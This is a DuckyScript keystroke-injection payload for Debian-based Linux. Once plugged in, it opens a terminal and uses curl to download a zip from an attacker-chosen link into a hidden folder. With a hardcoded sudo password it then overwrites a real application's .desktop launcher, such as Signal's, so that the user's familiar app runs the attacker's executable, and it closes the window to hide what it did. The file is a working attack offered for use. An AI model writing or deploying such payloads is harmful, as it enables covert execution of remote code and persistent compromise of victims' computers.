REM_BLOCK
################################################################
#                                                              #
# Title        : Edit The Default Real App With An Arbitrary   #
# Author       : Aleff                                         #
# Version      : 1.0                                           #
# Category     : Execution                                     #
# Target       : GNU/Linux (Debian based tested)               #
#                                                              #
################################################################
END_REM

REM Requirements:
REM     - sudo permissions
REM     - Internet connection
REM     - Executable app
REM     - '.desktop' file

REM Note:
REM     - The Depends* time depends by the app size, the connection fast and the computer power, you should test it

REM Set the link from wich will be downloaded the zip archive
DEFINE ARBITRARY_APP_LINK example

REM You must set the desktop file path present in the zip file, if i.e. you have the app name Signal and the desktop file path is Signal/files/signal you should put the path Signal/files/signal
DEFINE PATH_TO_DESKTOP_FILE example/path

REM You must know the original desktop name file, if you don't know it you can rich this information download the app on you system and going to /usr/share/applications/ searching this one app, i.e. the desktop file name of Signal application is signal-desktop.desktop, so in this case you should put signal-desktop.desktop
DEFINE ORIGINAL_DESKTOP_FILE_NAME example

REM sudo permissions needed
DEFINE SUDO example

EXTENSION DETECT_READY
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay

        TARGETS:
            Any system that reflects CAPSLOCK will detect minimum required delay
            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
    END_REM

    REM CONFIGURATION:
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120

    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

REM Open a shell
CTRL-ALT t
DELAY 1000

STRING curl -o ./arbitrary.zip "
STRING ARBITRARY_APP_LINK
STRINGLN "
REM Depends*
DELAY 5000

STRINGLN unzip ./arbitrary.zip -d ./.arbitrary
REM Depends*
DELAY 2000
STRINGLN rm ./arbitrary.zip
DELAY 1000

STRING sudo mv ./.arbitrary/
STRING PATH_TO_DESKTOP_FILE
STRING /usr/share/applications/
STRING ORIGINAL_DESKTOP_FILE_NAME
ENTER
DELAY 1000
STRING SUDO
ENTER
DELAY 4000
ALT f4
